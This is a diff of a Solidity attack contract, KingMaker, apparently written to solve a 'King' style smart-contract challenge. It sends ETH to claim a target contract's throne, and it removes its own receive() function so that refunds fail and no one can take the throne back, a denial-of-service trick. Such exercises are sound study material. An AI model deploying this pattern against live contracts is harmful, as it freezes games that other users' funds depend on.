@@ -40,17 +40,12 @@ contract KingMaker{
 
     function becomeKing(address _target)public{
 
-        _target.call{value:1100000000000000}("");
+        _target.call{value:1100000000000000}(""); //can make it cleaner with contract._prize()
     }
 
     function empty(address _myAddress) public{
         payable(_myAddress).transfer(address(this).balance); //send back the eth received initialy when I'm done with the contract
     }
 
-    receive() external payable {
-        if(msg.sender != owner){
-        target.call{value:msg.value + 1000}(""); //regain the king position when the level try to reclaim kingship
-        }
-    }
 }
 
